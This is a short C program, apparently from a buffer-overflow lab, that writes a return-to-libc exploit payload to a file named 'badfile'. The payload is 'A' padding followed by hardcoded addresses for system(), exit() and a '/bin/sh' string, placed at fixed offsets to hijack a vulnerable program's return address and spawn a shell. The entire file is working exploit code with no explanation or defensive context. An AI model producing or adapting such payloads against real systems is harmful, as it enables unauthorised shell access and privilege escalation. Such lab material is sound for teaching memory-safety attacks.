#include <stdlib.h> 
#include <stdio.h> 
#include <string.h> 
int main(int argc, char **argv) 
{ 
	char buf[43]; 
	memset(buf,'A', 43);
	FILE *output;
	output = fopen("./badfile", "w");

	*(long *) &buf[31] = 0xf7e0b370; // system() 
	*(long *) &buf[35] = 0xf7dfded0; // exit() 
	*(long *) &buf[39] = 0xffffd487; // "/bin/sh"

	fwrite(buf, sizeof(buf), 1, output); 
	fclose(output);
}
